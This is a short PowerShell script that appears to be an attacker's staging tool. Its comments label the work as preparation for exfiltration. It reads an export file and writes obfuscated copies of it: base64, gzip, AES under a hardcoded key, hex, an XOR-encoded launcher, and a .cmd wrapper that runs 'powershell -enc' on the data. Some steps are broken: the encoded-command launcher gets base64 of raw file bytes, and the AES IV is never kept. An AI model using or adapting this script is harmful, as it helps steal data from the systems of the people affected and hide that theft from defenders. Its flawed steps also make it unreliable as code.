$InFile = "export_summary_20250302_092215.txt"
$RawBytes = [System.IO.File]::ReadAllBytes($InFile)

# base64 encode for exfil
$B64 = [Convert]::ToBase64String($RawBytes)
[System.IO.File]::WriteAllText("staged_20250302_093010.b64", $B64)

# compress with gzip before encoding
$ms = New-Object System.IO.MemoryStream
$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$gz.Write($RawBytes, 0, $RawBytes.Length)
$gz.Close()
$CompBytes = $ms.ToArray()
$ms.Dispose()
[System.IO.File]::WriteAllBytes("staged_20250302_093020.gz", $CompBytes)

# AES encrypt the compressed blob
$Key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$Aes = [System.Security.Cryptography.Aes]::Create()
$Aes.Key = $Key
$Aes.GenerateIV()
$Enc = $Aes.CreateEncryptor()
$EncBytes = $Enc.TransformFinalBlock($CompBytes, 0, $CompBytes.Length)
[System.IO.File]::WriteAllBytes("staged_20250302_093030.enc", $EncBytes)

# XOR stage a cmd launcher
$CmdText = "powershell -EncodedCommand $B64"
$XorKey = 0x42
$XorBytes = $CmdText.ToCharArray() | ForEach-Object { [byte]$_ -bxor $XorKey }
[System.IO.File]::WriteAllBytes("staged_20250302_093040.bin", [byte[]]$XorBytes)

# hex encode for the session file
$HexStr = [BitConverter]::ToString($EncBytes) -replace '-',''
Set-Content -Path "staged_20250302_093050.ses" -Value $HexStr

# write a cmd wrapper
Set-Content -Path "staged_20250302_093100.cmd" -Value "@echo off`r`npowershell -enc $B64"
